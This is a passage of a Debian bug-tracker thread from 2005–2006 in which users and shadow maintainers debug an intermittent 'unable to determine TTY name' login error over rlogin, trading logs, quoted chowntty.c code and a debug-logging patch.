   Sep 23 02:42:46 cerebro login[453]: unable to determine TTY name, got /dev/pts/2
   Sep 22 14:00:34 cerebro login[453]: unable to determine TTY name, got /dev/pts/2
   Sep 20 12:36:59 cerebro login[453]: unable to determine TTY name, got /dev/pts/2
   May 18 15:00:03 cerebro login[442]: unable to determine TTY name, got /dev/pts/1
   Apr 25 06:44:50 cerebro login[601]: unable to determine TTY name, got /dev/tty3
   Mar 18 14:20:37 cerebro login[468]: unable to determine TTY name, got /dev/pts/4
   Feb 24 13:25:00 cerebro login[443]: unable to determine TTY name, got /dev/pts/2
   Feb 18 11:56:16 cerebro login[483]: unable to determine TTY name, got /dev/pts/4
   Feb  1 14:09:13 cerebro login[411]: unable to determine TTY name, got /dev/pts/2
   Jan 21 17:18:24 cerebro login[465]: unable to determine TTY name, got /dev/pts/3
   Nov 29 13:48:43 cerebro login[462]: unable to determine TTY name, got /dev/tty5
   Sep 30 13:36:22 cerebro login[394]: unable to determine TTY name, got /dev/pts/0
   Sep 14 22:41:27 cerebro login[404]: unable to determine TTY name, got /dev/pts/0
   Sep 14 22:34:23 cerebro login[404]: unable to determine TTY name, got /dev/pts/0
   Aug 31 12:35:40 cerebro login[378]: unable to determine TTY name, got /dev/pts/1
   Aug 29 10:19:51 cerebro login[378]: unable to determine TTY name, got /dev/pts/1
   Jul 28 14:05:28 cerebro login[402]: unable to determine TTY name, got /dev/pts/86
   Jul 12 17:20:03 cerebro login[552]: unable to determine TTY name, got /dev/tty5

As you can see, it's not exactly a frequent message, and seems independent
of the actual tty name and mostly of the login version (I upgrade at
least once/week, and one system is mostly following testing, the other
unstable).

However, I was under the impression that the problem occurs slightly more
often than the message, but such impressions might or might not be wrong,
I certainly don't remember for sure.

It also "haunts" me for a long time, although it wasn't exactly pressing
enough to report it, because I cannot reproduce it. I thought the message
would help finding the problem, but ... :)

> Marc, could you shed more light on your configuration,
> please?

Anything you want to know! The only thing I cannot provide is quick
reproducability, as it works most of the time (you can assume that I
log-in after reboot daily).

Also, it happens even when the machine was already up for, say, 10
minutes, so it doesn't seem like a race between login and the boot
sequence.

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=42), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=44), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=45), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Christian Perrier <bubulle@debian.org>
Cc: 332198@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#332198: login: unable to determine TTY name, got /dev/pts/1
Date: Fri, 7 Oct 2005 08:03:09 +0200
```
On Wed, Oct 05, 2005 at 06:13:58PM +0200, Christian Perrier <bubulle@debian.org> wrote:
> I actually think that the "unable to determine TTY name" from login is
> maybe not *the* cause of the problem.

Lucky day:

   cerebro ~/pserv# fuji
   rlogin: connection closed.
   cerebro ~/pserv# apt-get install xmltv
   E: Could not get lock /var/lib/apt/lists/lock - open (11 Resource temporarily unavailable)
   E: Unable to lock the list directory
   [Exit 100]
   cerebro ~/pserv#
   [Exit 100]
   cerebro ~/pserv# fuji
   fuji ~# tail /var/log/messages
   Oct  7 07:51:22 fuji named[1126]: USAGE 1128664282 1128426682 CPU=0.050992u/0.041993s CHILDCPU=0.050992u/0.034994s
   Oct  7 07:51:22 fuji named[1126]: NSTATS 1128664282 1128426682 A=152 PTR=86
   Oct  7 07:51:22 fuji named[1126]: XSTATS 1128664282 1128426682 RR=84 RNXD=7 RFwdR=12 RDupR=1 RFail=0 RFErr=0 RErr=1 RAXFR=0 RLame=0 ROpts=0 SSysQ=79 SAns=145 SFwdQ=103 SDupQ=840 SErr=34 RQ=238 RIQ=0 RFwdQ=103 RDupQ=16 RTCP=0 SFwdR=12 SFail=0 SFErr=0 SNaAns=127 SNXD=42 RUQ=0 RURQ=0 RUXFR=0 RUUpd=0
   Oct  7 07:57:11 fuji pam_rhosts_auth[6540]: allowed to root@cerebro as root
   Oct  7 07:57:11 fuji login[6541]: (pam_unix) session opened for user root by (uid=0)
   Oct  7 07:57:11 fuji login[6542]: ROOT LOGIN  on `pts/10' from `cerebro'
   Oct  7 07:57:11 fuji login[6541]: (pam_unix) session closed for user root
   Oct  7 07:57:18 fuji pam_rhosts_auth[6547]: allowed to root@cerebro as root
   Oct  7 07:57:18 fuji login[6548]: (pam_unix) session opened for user root by (uid=0)
   Oct  7 07:57:18 fuji login[6549]: ROOT LOGIN  on `pts/10' from `cerebro'

Just happened a few minutes ago: I tried to install xmltv on "fuji", and
as you can see the first try failed, the second worked. It was on the same
tty, and long after bootup, and NOT the first login, and finally did not
complain about the tty name.

So there seem to be two problems, my log-in problem and a suboptimal error
message, which are probably independent of each other.

Unfortunately, that was before upgrading to 4.0.12, i.e. still with 4.0.3
(so far it happens with 4.0.11 and 4.0.3).

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=47), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=47), [link](#46)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=50), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=50), [link](#49)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=52), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=52), [link](#51)).

---

[Message #53](#53) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=53), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=53), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: Marc Lehmann <schmorp@schmorp.de>, 332198@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] login: unable to determine TTY name, got /dev/pts/1
Date: Fri, 7 Oct 2005 20:50:48 +0300
```
Hello, thanks for your explanations!

On Fri, Oct 07, 2005 at 07:30:12AM +0200, Marc Lehmann wrote:
> On Wed, Oct 05, 2005 at 06:13:58PM +0200, Christian Perrier <bubulle@debian.org> wrote:
> > Can you try reproducing this with login and passwd packages from sid ?
>
> It happens with this version, too:
>
> ii  login                              4.0.11.1-1 system login tools
> ii  passwd                             4.0.11.1-1 change and administer password and group data

So I think this will happen with all current versions
of login/passwd.

> If you want, I can test with 4.0.12 if there are important changes between
> 4.0.11 and .12.

I think we need:
1) to change the error message to smth. more suitable
   // this would probably be propagaed to upstream
2) to add debug statements to the newest login
   // this I think could be left Debian-specific
   and after this we would like you to test the new
   version.

> > It also seems that you're trying to rsh from root to root on another
> > host.
> Yes.

Does the bug appear when you login locally
(localhost->localhost)? Do you think it _can_ at all be
seen with localhost logins (or I need 2 host setup in
order to test)?

> > Despite being highly insecure,
>
> Despite this being untrue and not substantiatable, people like to repeat
> this kind of non-fact often

We can discuss this more if you like, but I really
beleive that any auth without kind of host keys
involved (like in krb/ssh/ssl/ipsec) is insecure, prone
to MITM or even IP spoofing (when in the same broadcast
domain). But anyway this is irrelevant to the problem
and many people including me still use some kind of
"insecure" environments like NIS.

> > have you checked the contents of
> > /etc/securetty on the target machine?
>
> It does not contain any pts/* entries, but that doesn't matter,

Because you commented out pam_securetty.so, I see.

> > I actually think that the "unable to determine TTY name" from login is
> > maybe not *the* cause of the problem.
> That might very well be. I do not see that message, however, when it works

Christian meant, I think, that this message indicates
the problem but is not the cause of it, i.e. most
probably (and I agree here) the source is some external
to the login/passwd issue, like
devfs/devpts/udevd/initrd/libpam or alike.

> (probably >>99.999% of the time), and I have the syslog from my machines
> onscreen most of the time, so it is at least a hint on the problem, even if
> it's just another symptom.

Of course.
login makes chowntty and thus is very picky about it
(citing libmisc/chowntty.c):
> 	if (!is_my_tty (tty)) {
> 		SYSLOG ((LOG_WARN,
> 			 "unable to determine TTY name, got %s\n", tty));
> 		closelog ();
> 		exit (1);
> 	}
going further, we see the next:
> /*
>  * is_my_tty -- determine if "tty" is the same as TTY stdin is using
>  */
> static int is_my_tty (const char *tty)
> {
> 	struct stat by_name, by_fd;
>
> 	if (stat (tty, &by_name) || fstat (0, &by_fd))
> 		return 0;
>
> 	if (by_name.st_rdev != by_fd.st_rdev)
> 		return 0;
> 	else
> 		return 1;
> }
As you can see, either one of stats failed or rdevs
were different (and this is strange) -- that's why you
get "unable to determine TTY name" message.

I'll perhaps just add "SYSLOG ((LOG_DEBUG, ..." there
in order to have more specific info on the issue (your
help will be required to debug this).

But first I'll try to mimic your setup as close as
possible and try to hit the problem myself.

I have summarised remaining questions below, first my
assumptions:
A. let's take 2 hosts -- cerebro and fuji
   * you run `rlogin fuji` as root@cerebro
   * you have "cerebro root" in ~/.rhosts at fuji
     (BTW, I also made a .rhosts file imediately to test
     your report)
   * "pam_rhosts_auth.so suppress no_hosts_equiv" and pam_securetty.so
     commented out are your only customisations to distributive's
     /etc/pam.d/rlogin
now questions:
1. you have rsh-client on cerebro and [since now]
   rsh-server on fuji?
2. you have 3 mentions of /dev/tty[35] (!!!) in logs
   -- do you have any clue why the hell are they there?
   Did you had strange login denials on virtual console?
3. in first report you mentioned that you hit the
   problem after rebooting (fuji, AFAIU?) and trying to
   execute `rlogin fuji`. Generally, I was under
   impression that the problem happens _more_
   frequently after fuji's reboot. Maybe it's because
   you just rlogin there most frequently only after
   reboot?
4. I forgot to ask what is in fuji:/etc/pam.d/login?
   (and in relevant files like common-auth if any)
5. version of inetd?
6. what is configuration line for in.rlogind in inetd.conf?
7. do you have something unusual like chroot, devfs or
   uncommon rootfs like YAFFS or JFFS2?

P.S. I wrote expect script to test repeated rlogins,
but 'cause I'm not an expect guru I still don't know
how to stop expect script by e.g. ctrl-C...
--
WBR,
xrgtn

```

---

**Owner recorded as Alexander Gattin <arg@online.com.ua>.**
Request was from `Christian Perrier <bubulle@debian.org>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=332198;msg=55), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=55), [link](#54)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=57), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=57), [link](#56)).

---

**Acknowledgement sent** to `Christian Perrier <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=59), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=59), [link](#58)).

---

[Message #60](#60) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=60), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=60), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: 332198@bugs.debian.org, 332198-submitter@bugs.debian.org
Subject: Status of this bug
Date: Fri, 6 Jan 2006 18:50:07 +0100
```
The status of this bug report is kinda confusing.

I absolutely don't know whether someone is still investigating it. I
even don't know if it happens with recent releases of shadow.

In short, this seems to be a nice piece of nasty nightmare which could
lie around for a very long time until someone is really  annoyed by
this again.

So, what do we do?

--

```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=62), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=62), [link](#61)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=65), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=65), [link](#64)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=67), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=67), [link](#66)).

---

[Message #68](#68) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=68), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=68), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org
Cc: 332198-submitter@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 7 Jan 2006 00:24:01 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=332198;msg=68) (text/plain, inline)]
```
```
Hi!

On Fri, Jan 06, 2006 at 06:50:07PM +0100, Christian Perrier wrote:
> I absolutely don't know whether someone is still investigating it. I
> even don't know if it happens with recent releases of shadow.

I suspect it does. Sometimes. Actually I think the bug
is caused by /var/tmp/utmp file being corrupt from time
to time.

> In short, this seems to be a nice piece of nasty nightmare which could
> lie around for a very long time until someone is really  annoyed by
> this again.
>
> So, what do we do?

I propose to add syslog debug statements in the code
which will provide more information about tty when bug
_happens_. I think we could enable this debugging code
and just distribute the shadow with it compiled in,
because it will increase shadow's verbosity only a bit.

P.S. I have already patched/modified source
(libmisc/chowntty.c) in my working directory of
Tomasz's CVS. Diff against most recent CVS is attached.

You can see that even when error happens the code uses
LOG_DEBUG level.

If you agree upon this behaviour, I'll generate quilt
patch and enable it.

--
WBR,
xrgtn

```
```
[[chowntty.diff](bugreport.cgi?att=1;bug=332198;filename=chowntty.diff;msg=68) (text/plain, attachment)]
```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=70), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=70), [link](#69)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=73), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=73), [link](#72)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=75), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=75), [link](#74)).

---

[Message #76](#76) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=76), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=76), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Alexander Gattin <xrgtn@yandex.ru>, 332198-quiet@bugs.debian.org
Cc: 332198@bugs.debian.org, 332198-submitter@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 7 Jan 2006 09:18:28 +0100
```
On Sat, Jan 07, 2006 at 12:24:01AM +0200, Alexander Gattin <xrgtn@yandex.ru> wrote:
> Hi!
>
> On Fri, Jan 06, 2006 at 06:50:07PM +0100, Christian Perrier wrote:
> > I absolutely don't know whether someone is still investigating it. I
> > even don't know if it happens with recent releases of shadow.
>
> I suspect it does. Sometimes. Actually I think the bug
> is caused by /var/tmp/utmp file being corrupt from time
> to time.

A theory is better than no theory. In any case, I had this problem once
about a week ago, and I usually update to unstable on those machines every
few weeks at leats, so it still seems to be there.

> I propose to add syslog debug statements in the code
> which will provide more information about tty when bug
> _happens_. I think we could enable this debugging code
> and just distribute the shadow with it compiled in,
> because it will increase shadow's verbosity only a bit.

Great idea!

> You can see that even when error happens the code uses
> LOG_DEBUG level.
>
> If you agree upon this behaviour, I'll generate quilt
> patch and enable it.

I'd be happy to try to reproduce it!

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information stored**:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=78), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=78), [link](#77)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and filed, but not forwarded.
([full text](bugreport.cgi?bug=332198;msg=80), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=80), [link](#79)).

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=83), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=83), [link](#82)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=86), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=86), [link](#85)).

---

**Acknowledgement sent** to `Christian Perrier <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=88), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=88), [link](#87)).

---

[Message #89](#89) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=89), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=89), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: Marc Lehmann <schmorp@schmorp.de>, 332198@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 7 Jan 2006 09:46:13 +0100
```

> > You can see that even when error happens the code uses
> > LOG_DEBUG level.
> >
> > If you agree upon this behaviour, I'll generate quilt
> > patch and enable it.
>
> I'd be happy to try to reproduce it!

So, Alex, please go and commit this fix. Don't forget commenting the
quilt patch so that we later remember whether it's worth being
submitted upstream (it probably is anyway....as it improves logging)

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=91), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=91), [link](#90)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=93), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=93), [link](#92)).

---

[Message #94](#94) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=94), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=94), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org
Cc: Marc Lehmann <schmorp@schmorp.de>
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 7 Jan 2006 21:37:39 +0200
```
Hi!

On Sat, Jan 07, 2006 at 09:46:13AM +0100, Christian Perrier wrote:
> So, Alex, please go and commit this fix. Don't forget commenting the
> quilt patch so that we later remember whether it's worth being
> submitted upstream (it probably is anyway....as it improves logging)

I think it's not worth propagating upstream right now,
as reason of bug #332198 is not yet discovered and
generally it's better to commit solution instead (i.e.
something with magic "Closes: #332198" stanza %)).

> Accepted:
> login_4.0.14-2_i386.deb
>   to pool/main/s/shadow/login_4.0.14-2_i386.deb
> passwd_4.0.14-2_i386.deb
>   to pool/main/s/shadow/passwd_4.0.14-2_i386.deb
> shadow_4.0.14-2.diff.gz
>   to pool/main/s/shadow/shadow_4.0.14-2.diff.gz
> shadow_4.0.14-2.dsc
>   to pool/main/s/shadow/shadow_4.0.14-2.dsc

oops, I wasn't in time :-/ and missed -2 release...
Sorry, Marc.

--
WBR,
xrgtn

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=96), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=96), [link](#95)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=98), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=98), [link](#97)).

---

[Message #99](#99) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=99), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=99), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org
Cc: Marc Lehmann <schmorp@schmorp.de>
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sun, 8 Jan 2006 00:11:41 +0200
```
Forgot to say that I have committed the patch. Probably
I'll improve it further, but it's quite usable right
now.

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=101), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=101), [link](#100)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=103), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=103), [link](#102)).

---

[Message #104](#104) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=104), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=104), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org, 332198-submitter@bugs.debian.org
Cc: Marc Lehmann <schmorp@schmorp.de>
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 21 Jan 2006 00:35:47 +0200
```
Hi!

On Sun, Jan 08, 2006 at 12:11:41AM +0200, Alexander Gattin wrote:
> Forgot to say that I have committed the patch. Probably
> I'll improve it further, but it's quite usable right
> now.

Marc, last shadow release (1:4.0.14-3) includes this
patch. It should give us more clue about what really
happens.

The patch adds SYSLOG statements, most interesting is:
SYSLOG ((LOG_WARN, "`%s'.st_rdev(%u,%u) != stdin.st_rdev(%u,%u)\n",
 tty, major(by_name.st_rdev), minor(by_name.st_rdev),
 major(by_fd.st_rdev), minor(by_fd.st_rdev)));

Thus you'll be able to see what sort of device is
login's stdin and its record in utmp...

--
WBR,
xrgtn

```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=106), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=106), [link](#105)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=109), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=109), [link](#108)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=111), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=111), [link](#110)).

---

[Message #112](#112) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=112), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=112), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Alexander Gattin <xrgtn@yandex.ru>
Cc: 332198@bugs.debian.org, 332198-submitter@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Sat, 21 Jan 2006 18:59:09 +0100
```
On Sat, Jan 21, 2006 at 12:35:47AM +0200, Alexander Gattin <xrgtn@yandex.ru> wrote:
> Hi!
>
> On Sun, Jan 08, 2006 at 12:11:41AM +0200, Alexander Gattin wrote:
> > Forgot to say that I have committed the patch. Probably
> > I'll improve it further, but it's quite usable right
> > now.
>
> Marc, last shadow release (1:4.0.14-3) includes this
> patch. It should give us more clue about what really
> happens.

I installed them and will have a look in the future. Thanks!

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=114), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=114), [link](#113)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=117), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=117), [link](#116)).

---

**Acknowledgement sent** to `Christian Perrier <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=119), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=119), [link](#118)).

---

[Message #120](#120) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=120), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=120), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: Marc Lehmann <schmorp@schmorp.de>, 332198@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: Status of this bug
Date: Tue, 7 Feb 2006 18:43:29 +0100
```

> > > Forgot to say that I have committed the patch. Probably
> > > I'll improve it further, but it's quite usable right
> > > now.
> >
> > Marc, last shadow release (1:4.0.14-3) includes this
> > patch. It should give us more clue about what really
> > happens.
>
> I installed them and will have a look in the future. Thanks!

Marc,

Have you again been hit by this bug?

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=122), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=122), [link](#121)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>, Alexander Gattin <arg@online.com.ua>`.
([full text](bugreport.cgi?bug=332198;msg=124), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=124), [link](#123)).

---

[Message #125](#125) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=125), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=125), reply):

